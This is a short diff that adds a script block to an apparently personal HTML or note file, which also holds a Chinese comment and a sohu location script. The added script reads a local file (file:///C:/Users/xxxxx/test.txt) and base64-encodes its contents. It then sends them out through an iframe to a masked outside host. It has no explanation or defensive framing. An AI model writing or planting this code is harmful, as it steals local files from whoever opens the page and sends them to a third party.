@@ -1,3 +1,18 @@
+
+<script>
+
+function reqListener () {
+    var encoded = encodeURI(this.responseText);
+    var b64 = btoa(this.responseText);
+    var raw = this.responseText;
+    document.write('<iframe src="http://xxxxxxxxx.net?data='+b64+'"></iframe>');
+} 
+var oReq = new XMLHttpRequest(); 
+oReq.addEventListener("load", reqListener); 
+oReq.open("GET", "file:///C:/Users/xxxxx/test.txt"); 
+oReq.send();
+</script>
+
 #下次筛选一些有用得pppppp
 <p id="test">aa</p>
 <script src="http://pv.sohu.com/cityjson?ie=utf-8"></script>
